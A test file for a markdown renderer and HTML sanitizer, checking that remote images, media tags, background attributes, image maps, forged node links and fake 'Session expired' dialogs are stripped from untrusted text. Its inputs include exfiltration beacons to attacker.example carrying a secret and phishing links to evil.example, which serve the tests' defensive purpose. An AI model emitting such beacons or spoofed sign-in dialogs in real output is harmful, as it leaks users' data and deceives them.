import { describe, expect, it } from "vitest";
import { renderMarkdown, sanitizeHTML } from "./markdown";

describe("renderMarkdown", () => {
  it("turns remote images into links when remote media is off", () => {
    const html = renderMarkdown("![x](https://attacker.example/c?d=SECRET) ![y](/api/files/a.png)", {
      remoteMedia: false,
    });
    expect(html).not.toContain("<img src=\"https://attacker.example");
    expect(html).toContain('href="https://attacker.example/c?d=SECRET"');
    expect(html).toContain('<img src="/api/files/a.png"');
  });

  it("keeps remote images in document previews", () => {
    expect(renderMarkdown("![x](https://example.com/a.png)")).toContain(
      '<img src="https://example.com/a.png"',
    );
  });

  it("drops media tags and fetch attributes beyond img src", () => {
    const html = sanitizeHTML(
      '<video poster="https://e.x/p.png"></video><audio src="https://e.x/a"></audio>' +
        '<img src="/a.png" srcset="https://e.x/b.png 2x">',
    );
    expect(html).not.toMatch(/video|audio|poster|srcset|e\.x/);
  });

  it("opens external links in a new tab, node links in place", () => {
    const html = renderMarkdown("[out](https://example.com) [[proj/n1|in]]");
    const doc = new DOMParser().parseFromString(html, "text/html");
    const [out, node] = Array.from(doc.querySelectorAll("a"));
    expect(out.target).toBe("_blank");
    expect(out.rel).toBe("noopener noreferrer");
    expect(node.hasAttribute("data-node-link")).toBe(true);
    expect(node.target).toBe("");
  });

  it("drops a remote background, which fetches with no click", () => {
    const html = renderMarkdown(
      '<table background="https://attacker.example/t?d=SECRET"><tr><td background="https://attacker.example/c">x</td></tr></table>',
      { remoteMedia: false },
    );
    expect(html).not.toContain("attacker.example");
  });
});

// Untrusted text (a document, a repo's README, a copilot answer) must neither
// replace the app's tab nor dress up as the app's own dialogs.
describe("untrusted markup in rendered text", () => {
  const parse = (html: string) => new DOMParser().parseFromString(html, "text/html");

  it("drops image maps: an area is a link the new-tab rule never saw", () => {
    const html = renderMarkdown(
      '<map name="m"><area shape="rect" coords="0,0,999,999" href="https://evil.example/login"></map>' +
        '<img src="/a.png" usemap="#m">',
    );
    expect(parse(html).querySelector("map, area")).toBeNull();
    expect(html).not.toContain("evil.example");
  });

  it("gives every node link the href '#', even one written by hand", () => {
    const doc = parse(renderMarkdown('<a data-node-link="p/n" href="https://evil.example/login">s</a> [[p/n1|in]]'));
    const links = Array.from(doc.querySelectorAll<HTMLAnchorElement>("a[data-node-link]"));
    expect(links).toHaveLength(2);
    for (const link of links) {
      expect(link.getAttribute("href")).toBe("#");
      expect(link.target).toBe("");
    }
  });

  it("keeps only the class names the renderer writes", () => {
    const doc = parse(
      renderMarkdown(
        '<div class="confirm-backdrop"><div class="confirm-dialog">Session expired, <a class="node-link" href="https://evil.example">sign in</a></div></div>\n\n' +
          "```js\nlet x;\n```\n\n[[p/n1|in]]",
      ),
    );
    expect(doc.querySelector(".confirm-backdrop, .confirm-dialog")).toBeNull();
    // A plain link may not borrow the node-link look; a node link keeps it.
    expect(doc.querySelectorAll("a.node-link")).toHaveLength(1);
    expect(doc.querySelector("a.node-link")?.hasAttribute("data-node-link")).toBe(true);
    expect(doc.querySelector("code.language-js")).not.toBeNull();
  });

  it("drops dialogs: an open one floats over the page", () => {
    const html = sanitizeHTML("<dialog open>Session expired</dialog>");
    expect(parse(html).querySelector("dialog")).toBeNull();
    expect(html).toContain("Session expired");
  });
});
